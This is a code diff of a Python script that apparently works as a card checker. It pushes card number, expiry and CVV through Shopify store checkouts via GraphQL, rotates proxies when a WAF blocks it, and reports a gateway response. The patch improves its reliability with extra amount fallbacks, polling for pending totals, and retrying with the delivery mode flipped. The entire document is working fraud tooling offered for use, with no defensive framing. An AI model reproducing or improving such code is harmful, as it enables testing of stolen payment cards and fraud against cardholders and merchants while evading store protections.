@@ -142,8 +142,8 @@ SESSION_TIMEOUT    = 25
 VAULT_TIMEOUT      = 12
 RECEIPT_POLL_MAX   = 5
 RECEIPT_POLL_DELAY = 1.0
-P2_TOTAL_POLL_MAX  = 3
-P2_TOTAL_POLL_DELAY = 1.0
+P2_TOTAL_POLL_MAX  = 5      # was 3 — longer wait for slow stores
+P2_TOTAL_POLL_DELAY = 1.5   # was 1.0
 
 GQL_RETRY_ATTEMPTS = 1
 
@@ -1449,24 +1449,42 @@ async def gql(session, op_name, headers, payload, proxy,
 
 def _extract_amounts_from_seller(sp):
     """
-    FIX 1: Gateway hardcoded to "Shopify Payments" — ignores store-provided name.
+    Extracts amount + payment method from sellerProposal.
+    PATCH: 2 extra amount fallbacks (payment.totalAmount, paymentLines[0].amount)
+    so PendingTerms / late-resolving stores still get a positive total.
+    Gateway hardcoded to "Shopify Payments".
     """
     out = {
         "checkout_total": None, "total": None, "running": None,
         "payment_identifier": None, "payment_stable_id": None,
         "payment_due_at": None, "payment_special": None,
-        "gateway": "Shopify Payments",   # ── FORCED ───────────────────────
+        "gateway": "Shopify Payments",
     }
     try:
         v = (sp.get("checkoutTotal") or {}).get("value", {}).get("amount")
-        if v is not None: out["checkout_total"] = str(v)
+        if _positive_amount(v): out["checkout_total"] = str(v)
         v = (sp.get("total") or {}).get("value", {}).get("amount")
-        if v is not None: out["total"] = str(v)
+        if _positive_amount(v): out["total"] = str(v)
         v = (sp.get("runningTotal") or {}).get("value", {}).get("amount")
-        if v is not None: out["running"] = str(v)
+        if _positive_amount(v): out["running"] = str(v)
     except Exception: pass
+
     try:
         pay = sp.get("payment") or {}
+
+        # ── PATCH: extra amount fallbacks ──────────────────────────────
+        if not out["checkout_total"]:
+            v = (pay.get("totalAmount") or {}).get("value", {}).get("amount")
+            if _positive_amount(v):
+                out["checkout_total"] = str(v)
+        if not out["checkout_total"]:
+            for _pl in (pay.get("paymentLines") or []):
+                if isinstance(_pl, dict):
+                    v = (_pl.get("amount") or {}).get("value", {}).get("amount")
+                    if _positive_amount(v):
+                        out["checkout_total"] = str(v)
+                        break
+
         if pay.get("__typename") == "FilledPaymentTerms":
             best = None
             for m in pay.get("availablePaymentLines", []):
@@ -1478,7 +1496,6 @@ def _extract_amounts_from_seller(sp):
                 if best is None: best = pm
             if best:
                 out["payment_identifier"] = best["paymentMethodIdentifier"]
-                # ── FIX 1: hardcoded, not store-provided ────────────────
                 out["gateway"] = "Shopify Payments"
         pl = pay.get("paymentLines") or []
         if pl and isinstance(pl[0], dict):
@@ -1493,7 +1510,6 @@ def _extract_amounts_from_seller(sp):
 # Main flow
 # ═══════════════════════════════════════════════════════════════════════
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
-    # ── FIX 1: force Shopify Payments from the very start ────────────────
     gateway = "Shopify Payments"
     currency = "USD"
     variant_price_fallback = "0.00"
@@ -1585,7 +1601,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     session, ourl, cart_html, proxy, profile)
             else:
                 variant_id = str(numeric_vid)
-                # ── FIX 2: actually probe requires_shipping on permalink path ──
                 try:
                     probed = await probe_cart_requires_shipping(session, ourl, proxy, profile)
                     cart_requires_shipping = probed
@@ -1813,7 +1828,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             negotiated_stable_id = stableId or ""
             delivery_strategy = ""
-            # ── FIX 2: initial mode from cart_requires_shipping ──────────
             no_delivery_mode = not cart_requires_shipping
             checkpoint_data = None
 
@@ -2052,7 +2066,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             _is_ship_req = seller.get("isShippingRequired")
             _delivery_line_types = _fl.get("deliveryMethodTypes") or []
 
-            # ── FIX 2: trust all detection signals from P1 ────────────────
             if dtype == "FilledDeliveryTerms":
                 if _is_ship_req is False:
                     no_delivery_mode = True
@@ -2150,7 +2163,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     initial_delivery = _build_initial_delivery(no_delivery_mode)
                     proposal_variables["delivery"] = initial_delivery
 
-                    # Re-send P1 to sync state
                     await _gql_gap(0.5, 1.0)
                     response, resp_text_p1b = await gql(
                         session, "Proposal", headers, proposal_payload, proxy,
@@ -2171,7 +2183,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     except Exception:
                         pass
 
-                    # Rebuild active delivery with new mode and retry P2
                     active_delivery_input = _build_active_delivery(
                         no_delivery_mode, negotiated_stable_id, delivery_strategy)
                     proposal_variables["delivery"] = active_delivery_input
@@ -2218,11 +2229,76 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             print(f"[amount] P2: checkout={checkout_total!r} total={total_amount!r}")
 
+            # ── FIX 3: handle PendingTerms / UnavailableTerms in P2 ────────
+            _s2_dtype = (_s2.get("delivery") or {}).get("__typename", "")
+
+            if _s2_dtype == "PendingTerms":
+                print(f"[P2] ⏳ PendingTerms — polling up to 5 more times for totals")
+                for _pt in range(5):
+                    await asyncio.sleep(min(1.5 + 0.4 * _pt, 3.5))
+                    response, resp_text = await gql(
+                        session, "Proposal", headers, proposal_payload, proxy,
+                        checkout_html=text, checkout_origin=checkout_origin,
+                        build_id=build_id, profile=profile)
+                    if resp_text == "Change Proxy":
+                        return False, "Change Proxy", gateway, variant_price_fallback, currency
+                    if is_waf_block(resp_text):
+                        return False, "Change Proxy (WAF on pending-poll)", gateway, variant_price_fallback, currency
+                    try:
+                        _pj = json.loads(resp_text)
+                        _r_pt = (_pj.get("data", {}).get("session", {})
+                                 .get("negotiate", {}).get("result", {})) or {}
+                        _s_pt = _r_pt.get("sellerProposal") or {}
+                        _amt_pt = _extract_amounts_from_seller(_s_pt)
+                        if _amt_pt["checkout_total"]: checkout_total = _amt_pt["checkout_total"]
+                        if _amt_pt["total"]: total_amount = _amt_pt["total"]
+                        if _amt_pt["payment_identifier"]: payment_identifier = _amt_pt["payment_identifier"]
+                        if _amt_pt["payment_stable_id"]: payment_stable_id = _amt_pt["payment_stable_id"]
+                        if _amt_pt["payment_due_at"]: payment_due_at = _amt_pt["payment_due_at"]
+                        if _amt_pt["payment_special"]: payment_special = _amt_pt["payment_special"]
+                        if _r_pt.get("queueToken"):
+                            queueToken = _r_pt["queueToken"]
+                            headers["x-checkout-queue-token"] = queueToken
+                        _s_pt_dtype = (_s_pt.get("delivery") or {}).get("__typename", "")
+                        if (_s_pt_dtype == "FilledDeliveryTerms"
+                                or _positive_amount(checkout_total)
+                                or _positive_amount(total_amount)):
+                            print(f"[P2] ✅ PendingTerms resolved after {_pt+1} poll(s)")
+                            break
+                    except Exception:
+                        pass
+
+            elif _s2_dtype == "UnavailableTerms":
+                print(f"[P2] ⚠️ UnavailableTerms — no shipping rate; flipping delivery mode")
+                no_delivery_mode = not no_delivery_mode
+                active_delivery_input = _build_active_delivery(
+                    no_delivery_mode, negotiated_stable_id, delivery_strategy)
+                proposal_variables["delivery"] = active_delivery_input
+                await _gql_gap(0.5, 1.0)
+                response, resp_text = await gql(
+                    session, "Proposal", headers, proposal_payload, proxy,
+                    checkout_html=text, checkout_origin=checkout_origin,
+                    build_id=build_id, profile=profile)
+                try:
+                    _dj2 = json.loads(resp_text)
+                    _r2 = (_dj2.get("data", {}).get("session", {})
+                           .get("negotiate", {}).get("result", {})) or {}
+                    _s2 = _r2.get("sellerProposal") or {}
+                    amt = _extract_amounts_from_seller(_s2)
+                    checkout_total = amt["checkout_total"]; total_amount = amt["total"]
+                    if amt["payment_identifier"]: payment_identifier = amt["payment_identifier"]
+                    if amt["payment_stable_id"]: payment_stable_id = amt["payment_stable_id"]
+                    if amt["payment_due_at"]: payment_due_at = amt["payment_due_at"]
+                    if amt["payment_special"]: payment_special = amt["payment_special"]
+                    print(f"[P2] retry after flip: checkout={checkout_total!r} total={total_amount!r}")
+                except Exception:
+                    pass
+
             _needs_total_poll = (_positive_amount(checkout_total) is None
                                  and _positive_amount(total_amount) is None)
             if _needs_total_poll:
                 for _tp in range(P2_TOTAL_POLL_MAX):
-                    await asyncio.sleep(min(1.0 + 0.2 * _tp, 2.5))
+                    await asyncio.sleep(min(P2_TOTAL_POLL_DELAY + 0.4 * _tp, 3.5))
                     response, resp_text = await gql(
                         session, "Proposal", headers, proposal_payload, proxy,
                         checkout_html=text, checkout_origin=checkout_origin,
@@ -2876,7 +2952,6 @@ def index():
     except (ValueError, TypeError):
         pf = 0.0
 
-    # ── FIX 1: force Shopify Payments in output ────────────────────────
     return _pretty({
         "Response": response_code,
         "Gate":     "Shopify Payments",
@@ -3005,6 +3080,7 @@ if __name__ == "__main__":
     print(f"  Delivery:     auto-detect digital vs physical + flip-retry on mismatch")
     print(f"  Gateway:      always reported as Shopify Payments")
     print(f"  Pacing:       gql-gap {GQL_GAP_MIN:.1f}–{GQL_GAP_MAX:.1f}s between stages")
+    print(f"  P2 total poll: {P2_TOTAL_POLL_MAX}× @ {P2_TOTAL_POLL_DELAY}s (handles PendingTerms)")
     print(f"  uvloop:       {uv_status}")
     print(f"  PCI build:    {PCI_BUILD_ID}")
     print(f"  DEFAULT_SITE: {DEFAULT_SITE or '(unset — pass &site=… per request)'}")
